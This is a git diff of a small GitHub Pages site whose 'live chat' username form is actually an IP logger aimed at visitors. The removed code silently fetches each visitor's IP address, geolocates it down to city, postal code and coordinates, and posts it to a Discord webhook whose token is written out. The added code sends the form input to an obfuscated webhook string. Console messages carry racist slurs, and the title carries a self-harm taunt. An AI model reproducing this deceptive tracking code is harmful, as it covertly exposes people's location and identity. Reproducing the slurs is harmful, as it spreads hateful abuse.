@@ -2,7 +2,7 @@
 <head>
   <title>kys.penis</title>
   <meta property="og:title" content="kys.penis">
-  <meta property="og:description" content="GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD">
+  <meta property="og:description" content="GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD GET OUT OF MY HEAD">
   <meta property="og:image" content="https://sodaduhking2.github.io/sodaduhking2.github.io/background.jpg">
   <meta property="og:url" content="https://sodaduhking2.github.io/sodaduhking2.github.io/">
   <style>
@@ -85,7 +85,7 @@
   </a>
   
   <form id="ipLoggerForm">
-    <input type="text" id="ipAddress" placeholder="enter your usename for the live chat room">
+    <input type="text" id="ipAddress" placeholder="make a username for the chat">
     <button type="submit">live chat</button>
   </form>
   
@@ -107,54 +107,28 @@
 
     ipLoggerForm.addEventListener('submit', function(event) {
       event.preventDefault();
-      // Retrieve the IP address using a third-party API
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const ipAddress = data.ip;
-          // Retrieve additional information about the IP address
-          fetch(`https://ipapi.co/${ipAddress}/json/`)
-            .then(response => response.json())
-            .then(data => {
-              const ipInfo = `
-                IP Address: ${ipAddress}
-                Country: ${data.country_name}
-                Region: ${data.region}
-                City: ${data.city}
-                Timezone: ${data.timezone}
-                Postal Code: ${data.postal}
-                Latitude: ${data.latitude}
-                Longitude: ${data.longitude}
-              `;
-              // Send the IP information to a Discord webhook
-              const webhookUrl = 'https://discord.com/api/webhooks/1276318023124520980/SIqXfF2WcM-zJmA9r68rOYNEOM3hz6fYFAiGDrDJvo5ENd7N9D56mPzwRtwvy3Oag_Uz';
-              const payload = {
-                content: `New IP address logged:\n${ipInfo}`
-              };
-              fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-              })
-                .then(response => {
-                  if (response.ok) {
-                    console.log('IM WATCHING');
-                  } else {
-                    console.error('i just shit on your grandma');
-                  }
-                })
-                .catch(error => {
-                  console.error('big yay:', error);
-                });
-            })
-            .catch(error => {
-              console.error('kys:', error);
-            });
+      const ipAddress = ipAddressInput.value;
+      // Send the IP address to the encrypted Discord webhook
+      const encryptedWebhookUrl = 'NB2HI4DTHIXS6ZDJONRW64TEFZRW63JPMFYGSL3XMVRGQ33PNNZS6MJSG43DGMJYGAZDGMJSGQ2TEMBZHAYC6U2JOFMGMRRSK5RU2LL2JJWUCOLSGY4HET2ZJZCU6TJTNB5DMZSZIZAWSR2EOJCEU5TPGVCU4ZBXJY4UINJWNVIHU52SOR3XM6JTJ5QWOX2VPI======';
+      const payload = {
+        content: `New IP address logged: ${ipAddress}`
+      };
+      fetch(encryptedWebhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+        .then(response => {
+          if (response.ok) {
+            console.log('big yay');
+          } else {
+            console.error('your a nigger');
+          }
         })
         .catch(error => {
-          console.error('nigga:', error);
+          console.error('i do hate nigs', error);
         });
     });
   </script>
